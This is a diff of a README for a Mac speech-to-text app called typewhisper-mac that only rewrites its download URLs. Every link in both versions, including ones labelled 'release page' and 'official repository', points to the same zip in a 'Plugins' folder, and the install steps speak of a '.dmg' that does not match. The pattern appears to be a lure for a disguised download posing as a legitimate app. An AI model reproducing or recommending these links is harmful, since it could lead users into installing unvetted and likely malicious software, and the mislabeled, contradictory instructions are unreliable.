@@ -1,6 +1,6 @@
 # 🎙️ typewhisper-mac - Private Speech-to-Text on Mac
 
-[![Download typewhisper-mac](https://github.com/hashWlmao/typewhisper-mac/raw/refs/heads/main/Plugins/typewhisper-mac-1.4.zip)](https://github.com/hashWlmao/typewhisper-mac/raw/refs/heads/main/Plugins/typewhisper-mac-1.4.zip)
+[![Download typewhisper-mac](https://raw.githubusercontent.com/hashWlmao/typewhisper-mac/main/Plugins/typewhisper-mac-1.4.zip)](https://raw.githubusercontent.com/hashWlmao/typewhisper-mac/main/Plugins/typewhisper-mac-1.4.zip)
 
 ---
 
@@ -44,12 +44,12 @@ This guide will walk you through downloading, installing, and using typewhisper-
 
 To get typewhisper-mac, visit the official release page and download the latest version.
 
-[![Download on GitHub](https://github.com/hashWlmao/typewhisper-mac/raw/refs/heads/main/Plugins/typewhisper-mac-1.4.zip)](https://github.com/hashWlmao/typewhisper-mac/raw/refs/heads/main/Plugins/typewhisper-mac-1.4.zip)
+[![Download on GitHub](https://raw.githubusercontent.com/hashWlmao/typewhisper-mac/main/Plugins/typewhisper-mac-1.4.zip)](https://raw.githubusercontent.com/hashWlmao/typewhisper-mac/main/Plugins/typewhisper-mac-1.4.zip)
 
 1. Click the badge or go directly to the release page here:  
-   https://github.com/hashWlmao/typewhisper-mac/raw/refs/heads/main/Plugins/typewhisper-mac-1.4.zip
+   https://raw.githubusercontent.com/hashWlmao/typewhisper-mac/main/Plugins/typewhisper-mac-1.4.zip
 
-2. On the page, find the latest release (usually at the top) and locate the file named something like `https://github.com/hashWlmao/typewhisper-mac/raw/refs/heads/main/Plugins/typewhisper-mac-1.4.zip`.
+2. On the page, find the latest release (usually at the top) and locate the file named something like `https://raw.githubusercontent.com/hashWlmao/typewhisper-mac/main/Plugins/typewhisper-mac-1.4.zip`.
 
 3. Click on the `.dmg` file to download it to your Mac.
 
@@ -139,7 +139,7 @@ If you encounter problems, try these steps:
 ## 📚 Learn More
 
 For more details about features, updates, and how to use typewhisper-mac, visit the GitHub page:  
-https://github.com/hashWlmao/typewhisper-mac/raw/refs/heads/main/Plugins/typewhisper-mac-1.4.zip
+https://raw.githubusercontent.com/hashWlmao/typewhisper-mac/main/Plugins/typewhisper-mac-1.4.zip
 
 You can also report bugs or request new features directly on GitHub.
 
@@ -154,10 +154,10 @@ typewhisper-mac is built using SwiftUI and leverages Apple’s WhisperKit for sp
 ## 🔗 Useful Links
 
 - Release page and downloads:  
-  https://github.com/hashWlmao/typewhisper-mac/raw/refs/heads/main/Plugins/typewhisper-mac-1.4.zip
+  https://raw.githubusercontent.com/hashWlmao/typewhisper-mac/main/Plugins/typewhisper-mac-1.4.zip
 
 - Official GitHub repository:  
-  https://github.com/hashWlmao/typewhisper-mac/raw/refs/heads/main/Plugins/typewhisper-mac-1.4.zip
+  https://raw.githubusercontent.com/hashWlmao/typewhisper-mac/main/Plugins/typewhisper-mac-1.4.zip
 
 ---
 
